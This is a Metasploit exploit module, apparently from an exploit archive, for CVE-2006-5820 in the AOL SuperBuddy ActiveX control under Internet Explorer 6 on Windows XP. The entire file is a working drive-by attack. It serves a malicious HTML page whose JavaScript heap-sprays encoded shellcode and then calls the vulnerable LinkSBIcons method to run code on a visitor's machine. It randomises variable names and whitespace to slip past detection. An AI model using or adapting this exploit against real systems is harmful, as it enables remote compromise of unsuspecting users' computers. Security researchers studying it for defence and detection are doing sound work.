AOL SuperBuddy ActiveX Control Remote Code Execution Exploit (meta)
===================================================================

require &#039;msf/core&#039;

module Msf

class Exploits::Windows::Browser::AOL_SuperBuddy_LinkSBIcons < Msf::Exploit::Remote

	include Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			&#039;Name&#039;           => &#039;AOL Sb.Superbuddy vulnerability&#039;,
			&#039;Description&#039;    => %q{
			},
			&#039;License&#039;        => MSF_LICENSE,
			&#039;Author&#039;         => 
				[ 
					&#039;kradchad&#039;,
					&#039;leetpete&#039;
				],
			&#039;Version&#039;        => &#039;0.1&#039;,
			&#039;References&#039;     => 
				[
					[ &#039;CVE&#039;, &#039;CVE-2006-5820&#039;]
				],
			&#039;Payload&#039;        =>
				{
					&#039;Space&#039;          => 1024,
					&#039;BadChars&#039;       => "\x00",
	
				},
			&#039;Platform&#039;       => &#039;win&#039;,
			&#039;Targets&#039;        =>
				[
					[&#039;Windows XP SP0-SP2 / IE 6.0SP1 English&#039;, {&#039;Ret&#039; => 0x0c0c0c0c} ]
				],
			&#039;DefaultTarget&#039;  => 0))
	end

	def autofilter
		false
	end
	
	def on_request_uri(cli, request)

		# Re-generate the payload
		return if ((p = regenerate_payload(cli)) == nil)

		# Encode the shellcode
		shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))
		
		# Get a unicode friendly version of the return address
		addr_word  = [target.ret].pack(&#039;V&#039;).unpack(&#039;H*&#039;)[0][0,4]

		# Randomize the javascript variable names	
		var_buffer    = rand_text_alpha(rand(30)+2)
		var_shellcode = rand_text_alpha(rand(30)+2)
		var_unescape  = rand_text_alpha(rand(30)+2)
		var_x         = rand_text_alpha(rand(30)+2)
		var_i         = rand_text_alpha(rand(30)+2)
		var_tic       = rand_text_alpha(rand(30)+2)
		var_toc       = rand_text_alpha(rand(30)+2)
		
		# Randomize HTML data
		html          = rand_text_alpha(rand(30)+2)
		
		# Build out the message
		content = %Q|
<html>
<head>
	<script>
	try {
	
	var #{var_unescape}  = unescape ;
	var #{var_shellcode} = #{var_unescape}( "#{shellcode}" ) ;
	
	var #{var_buffer} = #{var_unescape}( "%u#{addr_word}" ) ;
	while (#{var_buffer}.length <= 0x100000) #{var_buffer}+=#{var_buffer} ;

	var #{var_x} = new Array() ;	
	for ( var #{var_i} =0 ; #{var_i} < 120 ; #{var_i}++ ) {
		#{var_x}[ #{var_i} ] = 		
			#{var_buffer}.substring( 0 ,  0x100000 - #{var_shellcode}.length ) + #{var_shellcode} ;
	}
	
	
   	var #{var_tic} = new ActiveXObject( &#039;Sb.SuperBuddy.1&#039; );	
	try { #{var_tic}.LinkSBIcons( #{target.ret} ) ; } catch( e ) { }

	
	} catch( e ) { window.location = &#039;about:blank&#039; ; }
	
	</script>
</head>
<body>
#{html}
</body>
</html>		
		|

		# Randomize the whitespace in the document
		content.gsub!(/\s+/) do |s|
			len = rand(100)+2
			set = "\x09\x20\x0d\x0a"
			buf = &#039;&#039;
			
			while (buf.length < len)
				buf << set[rand(set.length)].chr
			end
			
			buf
		end
		
		print_status("Sending exploit to #{cli.peerhost}:#{cli.peerport}...")

		# Transmit the response to the client
		send_response_html(cli, content)
	end

end

end



